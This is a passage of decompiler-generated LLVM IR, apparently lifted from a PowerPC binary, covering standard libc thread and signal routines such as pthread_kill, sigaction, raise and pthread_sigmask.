dec_label_pc_100175dc:                            ; preds = %dec_label_pc_100175cc
  store i32 268531168, i32* @lr, align 4
  %v2_100175dc = call i32 @__pthread_initialize_manager(i32 %v0_10017534)
  %tmp8 = icmp sgt i32 %v2_100175dc, -1
  br i1 %tmp8, label %dec_label_pc_100175fc, label %dec_label_pc_100175e8

dec_label_pc_100175e8:                            ; preds = %dec_label_pc_100175dc
  %v0_100175e8 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_100175f4 = inttoptr i32 %v0_100175e8 to i32*
  store i32 11, i32* %v2_100175f4, align 4
  %v0_1001763c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017638

dec_label_pc_100175fc:                            ; preds = %dec_label_pc_100175dc, %dec_label_pc_100175cc
  %v2_1001760c = ptrtoint i32* %stack_var_-184 to i32
  br label %dec_label_pc_10017608

dec_label_pc_10017608:                            ; preds = %dec_label_pc_10017624, %dec_label_pc_100175fc
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10017610 = load i32, i32* @global_var_100450e4.985, align 4
  store i32 268531228, i32* @lr, align 4
  %v2_10017618 = call i32 @__libc_write(i32 %v3_10017610, i32 %v2_1001760c)
  %v3_1001761c = icmp eq i32 %v2_10017618, -1
  br i1 %v3_1001761c, label %dec_label_pc_10017624, label %dec_label_pc_10017634

dec_label_pc_10017624:                            ; preds = %dec_label_pc_10017608
  %v0_10017624 = call i32 @__errno_location()
  %v1_10017628 = inttoptr i32 %v0_10017624 to i32*
  %v2_10017628 = load i32, i32* %v1_10017628, align 4
  %v3_1001762c = icmp eq i32 %v2_10017628, 4
  br i1 %v3_1001762c, label %dec_label_pc_10017608, label %dec_label_pc_10017634

dec_label_pc_10017634:                            ; preds = %dec_label_pc_10017608, %dec_label_pc_10017624, %dec_label_pc_100175a0, %dec_label_pc_1001758c
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10017638

dec_label_pc_10017638:                            ; preds = %dec_label_pc_100175e8, %dec_label_pc_10017570, %dec_label_pc_10017634
  %v0_1001763c = phi i32 [ %v0_1001763c.pre, %dec_label_pc_100175e8 ], [ -1, %dec_label_pc_10017570 ], [ 0, %dec_label_pc_10017634 ]
  ret i32 %v0_1001763c

; uselistorder directives
  uselistorder i32 %v3_10017560, { 1, 0, 2 }
  uselistorder i32 %v0_10017554, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10017534, { 1, 0, 2 }
  uselistorder i32 (i32)* @__pthread_initialize_manager, { 1, 0 }
  uselistorder label %dec_label_pc_10017638, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10017634, { 1, 0, 2, 3 }
}

define i32 @pthread_sighandler_rt(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_10017650 = load i32, i32* @lr, align 4
  store i32 %v0_10017650, i32* %r0.global-to-local, align 4
  %v4_10017654 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10017654, i32* %stack_var_-32, align 4
  %v5_10017654 = ptrtoint i32* %stack_var_-32 to i32
  %v0_10017658 = call i32 @__asm_mfcr()
  %v1_1001765c = mul i32 %v0_10017658, 4
  store i32 %v1_1001765c, i32* %r11.global-to-local, align 4
  %v0_10017664 = load i32, i32* @r2, align 4
  store i32 %v0_10017664, i32* %r31.global-to-local, align 4
  %v0_10017668 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017670 = add i32 %v0_10017664, 88
  %v2_10017670 = inttoptr i32 %v1_10017670 to i8*
  %v3_10017670 = load i8, i8* %v2_10017670, align 1
  %v4_10017670 = zext i8 %v3_10017670 to i32
  store i32 %v4_10017670, i32* %r0.global-to-local, align 4
  %v3_10017674 = icmp eq i8 %v3_10017670, 0
  br i1 %v3_10017674, label %dec_label_pc_1001768c, label %dec_label_pc_1001767c

dec_label_pc_1001767c:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10017680 = add i32 %v0_10017664, 32
  %v3_10017680 = inttoptr i32 %v2_10017680 to i32*
  store i32 %v0_10017658, i32* %v3_10017680, align 4
  %v0_10017684 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017684 = trunc i32 %v0_10017684 to i8
  %v2_10017684 = load i32, i32* @r2, align 4
  %v3_10017684 = add i32 %v2_10017684, 88
  %v4_10017684 = inttoptr i32 %v3_10017684 to i8*
  store i8 %v1_10017684, i8* %v4_10017684, align 1
  br label %dec_label_pc_100176b8

dec_label_pc_1001768c:                            ; preds = %entry
  %v1_1001768c = add i32 %v0_10017664, 84
  %v2_1001768c = inttoptr i32 %v1_1001768c to i32*
  %v3_1001768c = load i32, i32* %v2_1001768c, align 4
  store i32 %v3_1001768c, i32* %r30.global-to-local, align 4
  %v3_10017690 = icmp eq i32 %v3_1001768c, 0
  store i1 %v3_10017690, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10017690, label %dec_label_pc_10017698, label %dec_label_pc_1001769c

dec_label_pc_10017698:                            ; preds = %dec_label_pc_1001768c
  store i32 %v5_10017654, i32* %v2_1001768c, align 4
  %v0_100176a4.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001769c

dec_label_pc_1001769c:                            ; preds = %dec_label_pc_1001768c, %dec_label_pc_10017698
  %v0_100176a4 = phi i32 [ %v1_1001765c, %dec_label_pc_1001768c ], [ %v0_100176a4.pre, %dec_label_pc_10017698 ]
  %v2_100176a4 = add i32 %v0_100176a4, ptrtoint (i32* @global_var_10049710.1102 to i32)
  %v3_100176a4 = inttoptr i32 %v2_100176a4 to i32*
  %v4_100176a4 = load i32, i32* %v3_100176a4, align 4
  store i32 %v4_100176a4, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_100176a4)
  %v0_100176b0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100176b0, label %dec_label_pc_100176b4, label %dec_label_pc_100176b8

dec_label_pc_100176b4:                            ; preds = %dec_label_pc_1001769c
  %v0_100176b4 = load i32, i32* %r30.global-to-local, align 4
  %v1_100176b4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100176b4 = add i32 %v1_100176b4, 84
  %v3_100176b4 = inttoptr i32 %v2_100176b4 to i32*
  store i32 %v0_100176b4, i32* %v3_100176b4, align 4
  br label %dec_label_pc_100176b8

dec_label_pc_100176b8:                            ; preds = %dec_label_pc_1001769c, %dec_label_pc_1001767c, %dec_label_pc_100176b4
  store i32 %v0_10017668, i32* %r0.global-to-local, align 4
  %v1_100176c8 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10017658)
  ret i32 %v0_10017658

; uselistorder directives
  uselistorder i32 %v1_1001765c, { 1, 0 }
  uselistorder i32 %v0_10017658, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_100176b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001769c, { 1, 0 }
}

define i32 @pthread_null_sighandler() local_unnamed_addr {
entry:
  %v0_100176d4 = load i32, i32* @r3, align 4
  ret i32 %v0_100176d4
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268697600, i32* @r9, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  %v3_100176f8 = load i32, i32* @global_var_10045104.982, align 4
  %v4_100176fc = icmp eq i32 %v3_100176f8, %arg1
  br i1 %v4_100176fc, label %dec_label_pc_10017800, label %dec_label_pc_10017704

dec_label_pc_10017704:                            ; preds = %entry
  store i32 268697600, i32* @r9, align 4
  %v3_10017708 = load i32, i32* @global_var_10045108.994, align 4
  %v4_1001770c = icmp eq i32 %v3_10017708, %arg1
  br i1 %v4_1001770c, label %dec_label_pc_10017800, label %dec_label_pc_10017714

dec_label_pc_10017714:                            ; preds = %dec_label_pc_10017704
  store i32 268697600, i32* @r9, align 4
  %v3_10017718 = load i32, i32* @global_var_1004510c.995, align 4
  %v4_1001771c = icmp eq i32 %v3_10017718, %arg1
  br i1 %v4_1001771c, label %dec_label_pc_10017724, label %dec_label_pc_1001772c

dec_label_pc_10017724:                            ; preds = %dec_label_pc_10017714
  %v2_10017724 = icmp sgt i32 %arg1, 0
  br i1 %v2_10017724, label %dec_label_pc_10017800, label %dec_label_pc_1001772c

dec_label_pc_1001772c:                            ; preds = %dec_label_pc_10017714, %dec_label_pc_10017724
  %v3_1001772c = icmp eq i32* %arg2, null
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001772c, label %dec_label_pc_10017798, label %dec_label_pc_10017738

dec_label_pc_10017738:                            ; preds = %dec_label_pc_1001772c
  %v2_10017738 = ptrtoint i32* %stack_var_-168 to i32
  store i32 140, i32* @r5, align 4
  store i32 %v2_10017738, i32* @r3, align 4
  store i32 268531528, i32* @lr, align 4
  %v0_10017744 = call i32 @memcpy()
  store i32 %v0_10017744, i32* %r3.global-to-local, align 4
  %v0_10017748 = load i32, i32* @r30, align 4
  %v1_10017748 = inttoptr i32 %v0_10017748 to i32*
  %v2_10017748 = load i32, i32* %v1_10017748, align 4
  %tmp10 = or i32 %v2_10017748, 1
  %tmp11 = icmp eq i32 %tmp10, 1
  %v0_100177a0.pre.pre = load i32, i32* @r31, align 4
  br i1 %tmp11, label %dec_label_pc_10017794, label %dec_label_pc_10017754

dec_label_pc_10017754:                            ; preds = %dec_label_pc_10017738
  %tmp12 = icmp slt i32 %v0_100177a0.pre.pre, 1
  br i1 %tmp12, label %dec_label_pc_10017794, label %dec_label_pc_1001775c

dec_label_pc_1001775c:                            ; preds = %dec_label_pc_10017754
  %v2_1001775c = icmp sgt i32 %v0_100177a0.pre.pre, 64
  br i1 %v2_1001775c, label %dec_label_pc_10017794, label %dec_label_pc_10017764

dec_label_pc_10017764:                            ; preds = %dec_label_pc_1001775c
  %v1_10017764 = add i32 %v0_10017748, 132
  %v2_10017764 = inttoptr i32 %v1_10017764 to i32*
  %v3_10017764 = load i32, i32* %v2_10017764, align 4
  %v1_10017768 = and i32 %v3_10017764, 4
  %v3_10017768 = icmp eq i32 %v1_10017768, 0
  %. = select i1 %v3_10017768, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 31196), i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 30288)
  store i32 %v2_10017738, i32* %r3.global-to-local, align 4
  store i32 %., i32* %stack_var_-168, align 4
  br label %dec_label_pc_10017798

dec_label_pc_10017794:                            ; preds = %dec_label_pc_10017738, %dec_label_pc_1001775c, %dec_label_pc_10017754
  store i32 %v2_10017738, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10017798

dec_label_pc_10017798:                            ; preds = %dec_label_pc_1001772c, %dec_label_pc_10017764, %dec_label_pc_10017794
  %v0_100177a0 = phi i32 [ %arg1, %dec_label_pc_1001772c ], [ %v0_100177a0.pre.pre, %dec_label_pc_10017764 ], [ %v0_100177a0.pre.pre, %dec_label_pc_10017794 ]
  %v0_10017798 = phi i32 [ 0, %dec_label_pc_1001772c ], [ %v2_10017738, %dec_label_pc_10017764 ], [ %v2_10017738, %dec_label_pc_10017794 ]
  %v0_1001779c = load i32, i32* @r28, align 4
  store i32 %v0_100177a0, i32* %r3.global-to-local, align 4
  store i32 268531624, i32* @lr, align 4
  %v3_100177a4 = inttoptr i32 %v0_10017798 to i32*
  %v4_100177a4 = call i32 @__libc_sigaction(i32 %v0_100177a0, i32* %v3_100177a4, i32 %v0_1001779c)
  %v3_100177a8 = icmp eq i32 %v4_100177a4, -1
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v3_100177a8, label %dec_label_pc_1001780c, label %dec_label_pc_100177b4

dec_label_pc_100177b4:                            ; preds = %dec_label_pc_10017798
  %v0_100177b4 = load i32, i32* @r31, align 4
  %v1_100177b4 = add i32 %v0_100177b4, -1
  %v2_100177b8 = icmp ugt i32 %v1_100177b4, 63
  br i1 %v2_100177b8, label %dec_label_pc_10017808, label %dec_label_pc_100177c0

dec_label_pc_100177c0:                            ; preds = %dec_label_pc_100177b4
  %v0_100177c0 = load i32, i32* @r28, align 4
  %v3_100177c0 = icmp eq i32 %v0_100177c0, 0
  br i1 %v3_100177c0, label %dec_label_pc_100177dc, label %dec_label_pc_100177c8

dec_label_pc_100177c8:                            ; preds = %dec_label_pc_100177c0
  %v1_100177cc = mul i32 %v0_100177b4, 4
  store i32 ptrtoint (i32* @global_var_10049710.1102 to i32), i32* @r9, align 4
  %v2_100177d4 = add i32 %v1_100177cc, ptrtoint (i32* @global_var_10049710.1102 to i32)
  %v3_100177d4 = inttoptr i32 %v2_100177d4 to i32*
  %v4_100177d4 = load i32, i32* %v3_100177d4, align 4
  %v2_100177d8 = inttoptr i32 %v0_100177c0 to i32*
  store i32 %v4_100177d4, i32* %v2_100177d8, align 4
  br label %dec_label_pc_100177dc

dec_label_pc_100177dc:                            ; preds = %dec_label_pc_100177c0, %dec_label_pc_100177c8
  %v0_100177dc = load i32, i32* @r30, align 4
  %v3_100177dc = icmp eq i32 %v0_100177dc, 0
  br i1 %v3_100177dc, label %dec_label_pc_10017808, label %dec_label_pc_100177e4

dec_label_pc_100177e4:                            ; preds = %dec_label_pc_100177dc
  %v1_100177e4 = inttoptr i32 %v0_100177dc to i32*
  %v2_100177e4 = load i32, i32* %v1_100177e4, align 4
  store i32 %v2_100177e4, i32* @r11, align 4
  %v0_100177ec = load i32, i32* @r31, align 4
  %v1_100177ec = mul i32 %v0_100177ec, 4
  store i32 ptrtoint (i32* @global_var_10049710.1102 to i32), i32* @r9, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_100177f8 = add i32 %v1_100177ec, ptrtoint (i32* @global_var_10049710.1102 to i32)
  %v4_100177f8 = inttoptr i32 %v3_100177f8 to i32*
  store i32 %v2_100177e4, i32* %v4_100177f8, align 4
  %v0_1001781c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001780c

dec_label_pc_10017800:                            ; preds = %dec_label_pc_10017724, %dec_label_pc_10017704, %entry
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001780c

dec_label_pc_10017808:                            ; preds = %dec_label_pc_100177dc, %dec_label_pc_100177b4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001780c

dec_label_pc_1001780c:                            ; preds = %dec_label_pc_10017798, %dec_label_pc_10017800, %dec_label_pc_100177e4, %dec_label_pc_10017808
  %v0_1001781c = phi i32 [ -1, %dec_label_pc_10017798 ], [ 22, %dec_label_pc_10017800 ], [ %v0_1001781c.pre, %dec_label_pc_100177e4 ], [ 0, %dec_label_pc_10017808 ]
  ret i32 %v0_1001781c

; uselistorder directives
  uselistorder i32 %v0_100177a0, { 1, 0 }
  uselistorder i32 %v0_100177a0.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10017738, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 10, 1, 9, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 6, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %arg1, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder label %dec_label_pc_1001780c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100177dc, { 1, 0 }
  uselistorder label %dec_label_pc_10017798, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017794, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001772c, { 1, 0 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10017838 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_1001783c = add i32 %v1_10017838, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %v2_1001783c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268531796, i32* @lr, align 4
  %v0_10017850 = call i32 @__pthread_lock()
  %v0_10017854 = load i32, i32* @r31, align 4
  %v1_10017854 = add i32 %v0_10017854, 8
  %v2_10017854 = inttoptr i32 %v1_10017854 to i32*
  %v3_10017854 = load i32, i32* %v2_10017854, align 4
  store i32 %v0_10017854, i32* @r3, align 4
  %v3_1001785c = icmp eq i32 %v3_10017854, 0
  br i1 %v3_1001785c, label %dec_label_pc_10017870, label %dec_label_pc_10017864

dec_label_pc_10017864:                            ; preds = %entry
  %v1_10017864 = add i32 %v3_10017854, 16
  %v2_10017864 = inttoptr i32 %v1_10017864 to i32*
  %v3_10017864 = load i32, i32* %v2_10017864, align 4
  %v0_10017868 = load i32, i32* @r29, align 4
  %v4_10017868 = icmp eq i32 %v0_10017868, %v3_10017864
  br i1 %v4_10017868, label %dec_label_pc_1001787c, label %dec_label_pc_10017870

dec_label_pc_10017870:                            ; preds = %dec_label_pc_10017864, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10017874.1103 to i32), i32* @lr, align 4
  %v0_10017870 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100178a8

dec_label_pc_1001787c:                            ; preds = %dec_label_pc_10017864
  %v1_1001787c = add i32 %v3_10017854, 20
  %v2_1001787c = inttoptr i32 %v1_1001787c to i32*
  %v3_1001787c = load i32, i32* %v2_1001787c, align 4
  store i32 %v0_10017854, i32* @r3, align 4
  store i32 268531848, i32* @lr, align 4
  %v0_10017884 = call i32 @__pthread_unlock()
  %v0_10017888 = load i32, i32* @r30, align 4
  store i32 268531860, i32* @lr, align 4
  %v2_10017890 = call i32 @kill(i32 %v3_1001787c, i32 %v0_10017888)
  %v3_10017894 = icmp eq i32 %v2_10017890, -1
  br i1 %v3_10017894, label %dec_label_pc_100178a0, label %dec_label_pc_100178a8

dec_label_pc_100178a0:                            ; preds = %dec_label_pc_1001787c
  %v0_100178a0 = call i32 @__errno_location()
  %v1_100178a4 = inttoptr i32 %v0_100178a0 to i32*
  %v2_100178a4 = load i32, i32* %v1_100178a4, align 4
  br label %dec_label_pc_100178a8

dec_label_pc_100178a8:                            ; preds = %dec_label_pc_1001787c, %dec_label_pc_10017870, %dec_label_pc_100178a0
  %v0_100178b8 = phi i32 [ 0, %dec_label_pc_1001787c ], [ 3, %dec_label_pc_10017870 ], [ %v2_100178a4, %dec_label_pc_100178a0 ]
  ret i32 %v0_100178b8

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 1, 7, 6, 0, 5, 4, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), { 0, 8, 9, 12, 7, 13, 10, 11, 14, 1, 2, 3, 4, 15, 5, 6 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100178a8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100178d0 = call i32 @__GI_pthread_self()
  store i32 268531932, i32* @lr, align 4
  %v2_100178d8 = call i32 @pthread_kill(i32 %v0_100178d0, i32 %arg1)
  store i32 %v2_100178d8, i32* @r29, align 4
  %v3_100178dc = icmp eq i32 %v2_100178d8, 0
  br i1 %v3_100178dc, label %dec_label_pc_100178f4, label %dec_label_pc_100178e8

dec_label_pc_100178e8:                            ; preds = %entry
  %v0_100178e8 = call i32 @__errno_location()
  %v0_100178ec = load i32, i32* @r29, align 4
  %v2_100178ec = inttoptr i32 %v0_100178e8 to i32*
  store i32 %v0_100178ec, i32* %v2_100178ec, align 4
  br label %dec_label_pc_100178f4

dec_label_pc_100178f4:                            ; preds = %entry, %dec_label_pc_100178e8
  %v0_10017904 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_100178e8 ]
  ret i32 %v0_10017904

; uselistorder directives
  uselistorder label %dec_label_pc_100178f4, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-152 = alloca i32, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  %v3_1001791c = icmp eq i32 %arg2, 0
  store i32 %arg3, i32* %r29.global-to-local, align 4
  br i1 %v3_1001791c, label %dec_label_pc_100179a4, label %dec_label_pc_10017928

dec_label_pc_10017928:                            ; preds = %entry
  %v2_10017928 = ptrtoint i32* %stack_var_-152 to i32
  store i32 128, i32* @r5, align 4
  store i32 %v2_10017928, i32* @r3, align 4
  store i32 268532024, i32* @lr, align 4
  %v0_10017934 = call i32 @memcpy()
  %v0_10017938 = load i32, i32* %r30.global-to-local, align 4
  %v3_10017938 = icmp eq i32 %v0_10017938, 1
  br i1 %v3_10017938, label %dec_label_pc_10017988, label %dec_label_pc_10017940

dec_label_pc_10017940:                            ; preds = %dec_label_pc_10017928
  %v3_10017940 = icmp eq i32 %v0_10017938, 2
  br i1 %v3_10017940, label %dec_label_pc_10017954, label %dec_label_pc_10017948

dec_label_pc_10017948:                            ; preds = %dec_label_pc_10017940
  %v3_10017948 = icmp eq i32 %v0_10017938, 0
  br i1 %v3_10017948, label %dec_label_pc_10017964, label %dec_label_pc_100179a0

dec_label_pc_10017954:                            ; preds = %dec_label_pc_10017940
  store i32 %v2_10017928, i32* @r3, align 4
  %v3_1001795c = load i32, i32* @global_var_10045104.982, align 4
  store i32 268532068, i32* @lr, align 4
  %v2_10017960 = call i32 @__GI_sigaddset(i32 %v2_10017928, i32 %v3_1001795c)
  br label %dec_label_pc_10017964

dec_label_pc_10017964:                            ; preds = %dec_label_pc_10017948, %dec_label_pc_10017954
  store i32 %v2_10017928, i32* @r3, align 4
  store i32 268532084, i32* @lr, align 4
  %v1_10017970 = call i32 @__GI_sigdelset(i32 %v2_10017928)
  %v3_10017978 = load i32, i32* @global_var_1004510c.995, align 4
  %tmp6 = icmp slt i32 %v3_10017978, 1
  br i1 %tmp6, label %dec_label_pc_100179a0, label %dec_label_pc_10017990

dec_label_pc_10017988:                            ; preds = %dec_label_pc_10017928
  br label %dec_label_pc_10017990

dec_label_pc_10017990:                            ; preds = %dec_label_pc_10017964, %dec_label_pc_10017988
  store i32 %v2_10017928, i32* @r3, align 4
  store i32 268532120, i32* @lr, align 4
  %v1_10017994 = call i32 @__GI_sigdelset(i32 %v2_10017928)
  br label %dec_label_pc_100179a4

dec_label_pc_100179a0:                            ; preds = %dec_label_pc_10017948, %dec_label_pc_10017964
  br label %dec_label_pc_100179a4

dec_label_pc_100179a4:                            ; preds = %entry, %dec_label_pc_10017990, %dec_label_pc_100179a0
  %v0_100179a8 = phi i32 [ 0, %entry ], [ %v2_10017928, %dec_label_pc_10017990 ], [ %v2_10017928, %dec_label_pc_100179a0 ]
  %v0_100179a4 = load i32, i32* %r30.global-to-local, align 4
  %v0_100179ac = load i32, i32* %r29.global-to-local, align 4
  store i32 268532148, i32* @lr, align 4
  %v3_100179b0 = call i32 @__GI_sigprocmask(i32 %v0_100179a4, i32 %v0_100179a8, i32 %v0_100179ac)
  %v3_100179b4 = icmp eq i32 %v3_100179b0, -1
  br i1 %v3_100179b4, label %dec_label_pc_100179c0, label %dec_label_pc_100179c8

dec_label_pc_100179c0:                            ; preds = %dec_label_pc_100179a4
  %v0_100179c0 = call i32 @__errno_location()
  %v1_100179c4 = inttoptr i32 %v0_100179c0 to i32*
  %v2_100179c4 = load i32, i32* %v1_100179c4, align 4
  br label %dec_label_pc_100179c8

dec_label_pc_100179c8:                            ; preds = %dec_label_pc_100179a4, %dec_label_pc_100179c0
  %v0_100179d8 = phi i32 [ 0, %dec_label_pc_100179a4 ], [ %v2_100179c4, %dec_label_pc_100179c0 ]
  ret i32 %v0_100179d8

; uselistorder directives
  uselistorder i32 %v2_10017928, { 0, 1, 7, 6, 3, 2, 5, 4, 8 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100179c8, { 1, 0 }
  uselistorder label %dec_label_pc_100179a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100179a0, { 1, 0 }
  uselistorder label %dec_label_pc_10017990, { 1, 0 }
  uselistorder label %dec_label_pc_10017964, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v0_100179dc = load i32, i32* @lr, align 4
  store i32 %v0_100179dc, i32* %r0.global-to-local, align 4
  %v4_100179e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100179e0, i32* %stack_var_-32, align 4
  %v5_100179e0 = ptrtoint i32* %stack_var_-32 to i32
  %v0_100179e4 = call i32 @__asm_mfcr()
  %v1_100179e8 = mul i32 %v0_100179e4, 4
  store i32 %v1_100179e8, i32* %r11.global-to-local, align 4
  %v0_100179f0 = load i32, i32* @r2, align 4
  store i32 %v0_100179f0, i32* %r31.global-to-local, align 4
  %v0_100179f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100179fc = add i32 %v0_100179f0, 88
  %v2_100179fc = inttoptr i32 %v1_100179fc to i8*
  %v3_100179fc = load i8, i8* %v2_100179fc, align 1
  %v4_100179fc = zext i8 %v3_100179fc to i32
  store i32 %v4_100179fc, i32* %r0.global-to-local, align 4
  %v3_10017a00 = icmp eq i8 %v3_100179fc, 0
  br i1 %v3_10017a00, label %dec_label_pc_10017a18, label %dec_label_pc_10017a08

dec_label_pc_10017a08:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10017a0c = add i32 %v0_100179f0, 32
  %v3_10017a0c = inttoptr i32 %v2_10017a0c to i32*
  store i32 %v0_100179e4, i32* %v3_10017a0c, align 4
  %v0_10017a10 = load i32, i32* %r0.global-to-local, align 4
  %v1_10017a10 = trunc i32 %v0_10017a10 to i8
  %v2_10017a10 = load i32, i32* @r2, align 4
  %v3_10017a10 = add i32 %v2_10017a10, 88
  %v4_10017a10 = inttoptr i32 %v3_10017a10 to i8*
  store i8 %v1_10017a10, i8* %v4_10017a10, align 1
  br label %dec_label_pc_10017a44

dec_label_pc_10017a18:                            ; preds = %entry
  %v1_10017a18 = add i32 %v0_100179f0, 84
  %v2_10017a18 = inttoptr i32 %v1_10017a18 to i32*
  %v3_10017a18 = load i32, i32* %v2_10017a18, align 4
  store i32 %v3_10017a18, i32* %r30.global-to-local, align 4
  %v3_10017a1c = icmp eq i32 %v3_10017a18, 0
  store i1 %v3_10017a1c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10017a1c, label %dec_label_pc_10017a24, label %dec_label_pc_10017a28

dec_label_pc_10017a24:                            ; preds = %dec_label_pc_10017a18
  store i32 %v5_100179e0, i32* %v2_10017a18, align 4
  %v0_10017a30.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10017a28

dec_label_pc_10017a28:                            ; preds = %dec_label_pc_10017a18, %dec_label_pc_10017a24
  %v0_10017a30 = phi i32 [ %v1_100179e8, %dec_label_pc_10017a18 ], [ %v0_10017a30.pre, %dec_label_pc_10017a24 ]
  %v2_10017a30 = add i32 %v0_10017a30, ptrtoint (i32* @global_var_10049710.1102 to i32)
  %v3_10017a30 = inttoptr i32 %v2_10017a30 to i32*
  %v4_10017a30 = load i32, i32* %v3_10017a30, align 4
  store i32 %v4_10017a30, i32* %r11.global-to-local, align 4
  call void @__pseudo_call(i32 %v4_10017a30)
  %v0_10017a3c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10017a3c, label %dec_label_pc_10017a40, label %dec_label_pc_10017a44

dec_label_pc_10017a40:                            ; preds = %dec_label_pc_10017a28
  %v0_10017a40 = load i32, i32* %r30.global-to-local, align 4
  %v1_10017a40 = load i32, i32* %r31.global-to-local, align 4
  %v2_10017a40 = add i32 %v1_10017a40, 84
  %v3_10017a40 = inttoptr i32 %v2_10017a40 to i32*
  store i32 %v0_10017a40, i32* %v3_10017a40, align 4
  br label %dec_label_pc_10017a44

dec_label_pc_10017a44:                            ; preds = %dec_label_pc_10017a28, %dec_label_pc_10017a08, %dec_label_pc_10017a40
  store i32 %v0_100179f4, i32* %r0.global-to-local, align 4
  %v1_10017a54 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100179e4)
  ret i32 %v0_100179e4

; uselistorder directives
  uselistorder i32 %v1_100179e8, { 1, 0 }
  uselistorder i32 %v0_100179e4, { 3, 1, 2, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_10017a44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10017a28, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-772 = alloca i32, align 4
